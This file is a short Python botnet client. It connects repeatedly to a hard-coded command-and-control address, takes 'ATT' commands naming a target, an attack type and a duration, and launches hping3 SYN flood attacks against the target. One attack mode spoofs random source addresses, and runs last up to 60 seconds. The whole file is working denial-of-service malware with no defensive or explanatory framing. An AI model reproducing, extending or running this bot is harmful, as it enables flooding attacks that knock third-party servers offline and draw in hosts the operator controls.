import socket, time, os
import urllib.request
import subprocess


CNC_IP = "10.10.10.100"
CNC_PORT = 5002

def connect_to_cnc():
    while True:
        try:    
            s = socket.socket()
            s.connect((CNC_IP, CNC_PORT))
            return s
        except:
            time.sleep(5)

def listen(sock):
    while True:
        try:
            data = sock.recv(1024).decode().strip()

            if data.startswith("ATT"):
                parts = data.split()
                print("Received data: ", data)
                print(parts)
            else:
                print("Received malformed data: ", data)


            if len(parts) >= 3:
                target = parts[1]
                type_att = parts[2]
    
                if len(parts) >= 4:
                    try:        
                        duration = int(parts[3])
                        attack(target, type_att, min(duration, 60))
                    except ValueError:
                        print("Error: duration")
                else:
                    attack(target, type_att, 10)
            else:
                print("Error");



        except Exception as e:
            print("Errore:", e)
        
        time.sleep(1)

def attack(target,type_att, duration):
    # hping 3 -S --flood --rand-source -p 80 {target}

    if type_att == "1":
            
        hping_cmd = [
            "sudo", "hping3",
            "-S",
            "-p", "80", 
            "--flood",
            target
        ]
        
        process = subprocess.Popen(hping_cmd)
    elif type_att == "2":
        hping_cmd = [
                "sudo", "hping3", "-S","-p","80","--flood","--rand-source",target
                ]
            
    
        print(f"Running: {' '.join(hping_cmd)}")
        # Start the process
        process = subprocess.Popen(hping_cmd)
    
    # Run for <60 seconds
    time.sleep(duration)
    
    # Stop the process
    process.terminate()
    process.wait()
    print("Hping3 stopped.")

while True:
    sock = connect_to_cnc()
    listen(sock)

